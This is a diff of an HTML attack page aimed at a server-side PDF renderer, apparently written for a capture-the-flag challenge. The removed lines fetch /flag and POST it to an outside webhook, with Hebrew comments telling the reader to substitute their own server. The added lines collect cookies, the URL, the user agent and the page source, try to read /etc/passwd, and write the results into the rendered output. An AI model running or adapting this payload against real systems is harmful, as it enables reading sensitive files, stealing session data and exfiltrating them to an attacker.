@@ -1,55 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Exploit PDF JS Renderer</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 2em; background: #111; color: #eee; }
-    h1 { color: #f66; }
-    pre { background: #222; padding: 1em; border-radius: 6px; overflow-x: auto; max-height: 300px; }
-    #status { margin-top: 1em; font-weight: bold; }
-  </style>
+<meta charset="UTF-8" />
+<title>Leak Info for PDF Render</title>
 </head>
 <body>
-  <h1>Trying to exfiltrate internal data</h1>
-  <p>This page will try to fetch <code>/flag</code> and send it back to my server.</p>
-  <pre id="log">Starting...</pre>
-  <div id="status"></div>
+<h1>Server Side PDF Render Leak</h1>
+<div id="info" style="white-space: pre-wrap; font-family: monospace;"></div>
 
-  <script>
-    (async () => {
-      const logEl = document.getElementById('log');
-      const statusEl = document.getElementById('status');
-      const webhookUrl = 'https://jakovkatz.github.io/ctf/log'; // <-- החלף לכתובת שלך
+<script>
+(async function() {
+  let info = '';
 
-      function log(msg) {
-        logEl.textContent += '\n' + msg;
-        console.log(msg);
-      }
+  info += 'Cookies:\n' + document.cookie + '\n\n';
 
-      try {
-        log('Fetching /flag...');
-        const response = await fetch('/flag');
-        if (!response.ok) throw new Error('Fetch failed with status ' + response.status);
-        const flag = await response.text();
-        log('Flag content retrieved:');
-        log(flag.slice(0, 500)); // מציג עד 500 תווים
+  // URL
+  info += 'Current URL:\n' + window.location.href + '\n\n';
 
-        log('Sending data to webhook...');
-        const sendResp = await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ flag })
-        });
-        if (!sendResp.ok) throw new Error('Webhook POST failed with status ' + sendResp.status);
+  // User Agent
+  info += 'User Agent:\n' + navigator.userAgent + '\n\n';
 
-        statusEl.textContent = '✅ Data sent successfully!';
-        log('Done.');
-      } catch (err) {
-        statusEl.textContent = '❌ Error: ' + err.message;
-        log('Error: ' + err.message);
-      }
-    })();
-  </script>
+  info += 'Page HTML Content:\n' + document.documentElement.outerHTML + '\n\n';
+
+  try {
+    const res = await fetch('/etc/passwd');
+    if(res.ok) {
+      const text = await res.text();
+      info += '/etc/passwd content:\n' + text + '\n\n';
+    } else {
+      info += '/etc/passwd fetch failed: ' + res.status + '\n\n';
+    }
+  } catch(e) {
+    info += 'Fetch error: ' + e.message + '\n\n';
+  }
+
+  document.getElementById('info').textContent = info;
+})();
+</script>
 </body>
 </html>
